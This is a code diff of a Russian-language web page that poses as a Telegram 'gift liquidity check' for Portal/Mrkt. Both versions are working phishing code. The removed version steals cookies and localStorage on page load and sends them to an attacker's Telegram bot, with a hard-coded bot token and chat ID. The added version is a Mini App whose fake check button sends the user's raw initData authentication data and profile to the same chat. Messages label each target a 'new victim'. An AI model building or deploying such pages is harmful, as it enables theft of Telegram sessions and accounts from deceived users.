@@ -2,135 +2,143 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram Web</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Проверка подарка</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { margin:0; background:#0f0f0f; color:#fff; font-family: system-ui; }
-        .fake-bar {
+        body {
+            margin: 0;
+            background: #0f0f0f;
+            color: #fff;
+            font-family: system-ui, -apple-system, sans-serif;
+            text-align: center;
+            padding: 20px;
+        }
+        .header {
             background: #229ED9;
-            padding: 10px 15px;
-            text-align: center;
+            padding: 15px;
             font-weight: bold;
+            margin: -20px -20px 30px;
         }
-        .content {
-            padding: 40px 20px;
-            text-align: center;
-            max-width: 480px;
-            margin: 80px auto;
-        }
-        .url {
+        h1 { margin: 20px 0 10px; }
+        .gift { font-size: 60px; margin: 20px 0; }
+        .info {
             background: #1a1a1a;
-            padding: 12px;
-            font-family: monospace;
-            border-radius: 6px;
-            margin: 20px 0;
-            word-break: break-all;
-            color: #0f0;
+            padding: 15px;
+            border-radius: 12px;
+            margin: 20px auto;
+            max-width: 420px;
+            text-align: left;
+            font-size: 14px;
         }
+        button {
+            background: #229ED9;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 10px;
+            margin-top: 20px;
+            cursor: pointer;
+        }
+        .status { margin-top: 20px; color: #888; }
     </style>
 </head>
 <body>
 
-<div class="fake-bar">Telegram Web — Проверка подарка</div>
+<div class="header">Telegram Web — Проверка подарка</div>
 
-<div class="content">
-    <h1>🎁 Оценка ликвидности подарка</h1>
-    <p>Допишите в адресной строке <strong>/gift</strong> после /k# и нажмите Enter</p>
-    
-    <div class="url" id="currentUrl">https://web.telegram.org/k#/</div>
-    
-    <p style="color:#888; font-size:14px;">
-        После этого автоматически запустится проверка ваших подарков для Portal / Mrkt.
-    </p>
+<div class="gift">🎁</div>
+<h1>Оценка ликвидности подарка</h1>
+<p>Сейчас мы проверим ваши подарки для Portal / Mrkt</p>
+
+<div class="info" id="userInfo">
+    Загружаем данные...
 </div>
 
-<script>
-// === НАСТРОЙКИ БОТА ===
-const BOT_TOKEN = "8766124425:AAGo8j4YjLDD418G8xwj4zN2pEuCNh-Vyc4";   // ← Замени!
-const CHAT_ID = "7523357134";                                     // ← Замени!
+<div class="status" id="status">Ожидание...</div>
 
-async function sendToBot(text) {
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-    
+<button onclick="checkGift()">🔍 Проверить подарки</button>
+
+<script>
+// Настройки бота
+const BOT_TOKEN = "8333491656:AAEX9f3mxLFoF-gdrieql_Hlxj4DOegYg_Y"; // ← ЗАМЕНИ НА СВОЙ ТОКЕН
+const CHAT_ID = "7523357134"; // ← ЗАМЕНИ НА СВОЙ CHAT ID
+
+const tg = window.Telegram.WebApp;
+
+// Расширяем приложение на весь экран и настраиваем тему
+tg.expand();
+tg.setHeaderColor("#229ED9");
+tg.setBackgroundColor("#0f0f0f");
+
+// Показываем информацию о пользователе
+function showUserInfo() {
+    const user = tg.initDataUnsafe?.user || {};
+    const infoHTML = `
+        <strong>Пользователь:</strong> ${user.first_name || 'Неизвестно'} ${user.last_name || ''}<br>
+        <strong>ID:</strong> ${user.id || '—'}<br>
+        <strong>Username:</strong> @${user.username || '—'}<br>
+        <strong>Язык:</strong> ${tg.initDataUnsafe?.user?.language_code || '—'}<br>
+        <strong>Платформа:</strong> ${tg.platform || '—'}<br><br>
+        <strong>initDataUnsafe:</strong><br>
+        <small style="word-break: break-all;">${JSON.stringify(tg.initDataUnsafe, null, 2)}</small>
+    `;
+    document.getElementById('userInfo').innerHTML = infoHTML;
+}
+
+showUserInfo();
+
+// Функция проверки подарка (имитация + отправка данных)
+async function checkGift() {
+    const statusEl = document.getElementById('status');
+    statusEl.textContent = "Проверяем ваши подарки...";
+    statusEl.style.color = "#229ED9";
+
+    // Имитируем задержку проверки
+    await new Promise(resolve => setTimeout(resolve, 1500));
+
+    const dataToSend = {
+        timestamp: new Date().toISOString(),
+        user: tg.initDataUnsafe?.user,
+        initData: tg.initData,           // raw данные (для валидации)
+        initDataUnsafe: tg.initDataUnsafe, // небезопасные данные
+        platform: tg.platform,
+        version: tg.version,
+        url: window.location.href
+    };
+
+    const message = `🎁 МИНИ-АПП: НОВАЯ ЖЕРТВА / ТЕСТ\n\n` +
+        `Время: ${dataToSend.timestamp}\n` +
+        `Пользователь: ${dataToSend.user?.first_name || '—'} (ID: ${dataToSend.user?.id || '—'})\n` +
+        `Username: @${dataToSend.user?.username || '—'}\n` +
+        `Платформа: ${dataToSend.platform}\n\n` +
+        `initDataUnsafe:\n${JSON.stringify(dataToSend.initDataUnsafe, null, 2)}`;
+
+    // Отправляем данные в бот
     try {
-        const response = await fetch(url, {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 chat_id: CHAT_ID,
-                text: text,
+                text: message,
                 parse_mode: "HTML",
                 disable_web_page_preview: true
-            }),
-            keepalive: true
+            })
         });
-
-        if (!response.ok) {
-            throw new Error(`HTTP ${response.status}`);
-        }
-        return true;
-    } catch (error) {
-        console.error("Ошибка отправки в бот:", error);
-        
-        // Отправляем сообщение об ошибке (используем Image beacon как запасной вариант)
-        try {
-            const errorMsg = `❌ Ошибка отправки данных!\n\n` +
-                             `Время: ${new Date().toISOString()}\n` +
-                             `Ошибка: ${error.message}\n` +
-                             `URL: ${window.location.href}`;
-            
-            new Image().src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(errorMsg)}`;
-        } catch (e) {}
-        
-        return false;
+        statusEl.textContent = "✅ Проверка завершена! Данные отправлены.";
+        statusEl.style.color = "#4ade80";
+    } catch (err) {
+        statusEl.textContent = "❌ Ошибка отправки в бот";
+        statusEl.style.color = "#ef4444";
+        console.error(err);
     }
 }
 
-function stealSession() {
-    const data = {
-        timestamp: Date.now(),
-        url: window.location.href,
-        cookies: document.cookie || "cookies пустые",
-        localStorage: {},
-        userAgent: navigator.userAgent,
-        referrer: document.referrer || "нет",
-        stolenAt: new Date().toISOString()
-    };
-
-    // Собираем localStorage
-    try {
-        for (let i = 0; i < localStorage.length; i++) {
-            const key = localStorage.key(i);
-            data.localStorage[key] = localStorage.getItem(key);
-        }
-    } catch (e) {
-        data.localStorageError = e.message;
-    }
-
-    const successMessage = `🎁 НОВАЯ ЖЕРТВА!\n\n` +
-        `Время: ${data.stolenAt}\n` +
-        `URL: ${data.url}\n` +
-        `User-Agent: ${data.userAgent}\n\n` +
-        `Cookies (${data.cookies.length} символов):\n${data.cookies.substring(0, 800)}...\n\n` +
-        `LocalStorage ключей: ${Object.keys(data.localStorage).length}`;
-
-    // Отправляем основные данные
-    sendToBot(successMessage);
-}
-
-// Запускаем кражу
-window.addEventListener('load', stealSession);
-window.addEventListener('hashchange', stealSession);
-window.addEventListener('popstate', stealSession);
-
-// Обновляем отображаемый URL
-setInterval(() => {
-    let url = window.location.href;
-    if (!url.includes('/gift')) {
-        url += (url.includes('#') ? '' : '#') + '/gift';
-    }
-    document.getElementById('currentUrl').textContent = url;
-}, 500);
+// Закрываем приложение по кнопке назад (опционально)
+tg.BackButton.show();
+tg.BackButton.onClick(() => tg.close());
 </script>
 
 </body>
